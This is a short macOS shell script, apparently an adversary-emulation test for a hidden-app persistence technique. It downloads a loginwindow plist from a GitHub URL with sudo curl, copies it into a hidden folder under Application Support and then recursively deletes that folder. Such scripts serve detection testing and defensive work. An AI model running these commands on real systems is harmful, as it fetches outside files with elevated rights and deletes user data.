#!/usr/bin/env sh
#ATTACK_PERSISTENCE_T1159_MACOS_FILE_PLIST_HIDDEN_APP
sudo curl https://raw.githubusercontent.com/Pratik-987/Macos/main/com.apple.loginwindow.plist -o ~/Downloads/com.apple.loginwindow.plist
mkdir ~/Library/Application\ Support/tmp
mkdir ~/Library/Application\ Support/tmp/.tmp1
cp ~/Downloads/com.apple.loginwindow.plist ~/Library/Application\ Support/tmp/.tmp1/
rm -rf -R ~/Library/Application\ Support/tmp